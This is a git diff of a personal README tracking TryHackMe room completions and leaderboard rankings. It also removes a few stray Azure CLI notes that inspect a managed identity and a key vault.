+|6      |Easy 🔗 - Linux Strength Training     | 5 |     98ᵗʰ  |     3ʳᵈ    |    3,172ⁿᵈ   |       47ᵗʰ     |    136,608  |    1,059    |    84     |
+|4      |Medium 🚩 - JVM Reverse Engineering   | 3 |     96ᵗʰ  |     3ʳᵈ    |    3,031ˢᵗ   |       46ᵗʰ     |    136,450  |    1,058    |    84     |
+|3      |Medium 🚩 - Carrotbane of My Existence| 2 |     96ᵗʰ  |     3ʳᵈ    |    3,468ᵗʰ   |       49ᵗʰ     |    136,150  |    1,057    |    84     |
+|2      |Easy 🔗 - Learn Rust                  | 1 |     96ᵗʰ  |     3ʳᵈ    |    5,152ⁿᵈ   |       67ᵗʰ     |    136,030  |    1,056    |    84     |
 
 
-
-az login --identity
-
-
-az keyvault show --name akv-11236982 --resource-group rg-11236982
+</h6></div><br>
 
 
+<p align="center">Global All Time:    86ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/8304c2ee-8f3a-45da-bda9-0a8ff5eab4e8"><br>
+                                              <img width="1200px" src="https://github.com/user-attachments/assets/ade96483-6f31-4489-936a-0a8d3c821122"><br><br>
+                  Brazil All Time:      3ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/8356d7d7-ed2e-4961-9731-9edf4635a484"><br><br>
+                  Global monthly:     558ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/37bbbd30-2ed4-4209-8347-9097a71c9d4c"><br><br>
+                  Brazil monthly:       5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/7a24a464-82ae-4571-bf5c-f55591ecccfa"></p>
 
-enableRbacAuthorization": true??????
-
-
-az vm identity show --name LinuxVM --resource-group rg-11236982 --query principalId --output tsv
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+<h1 align="center">Thanks for coming!</h1>
+<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
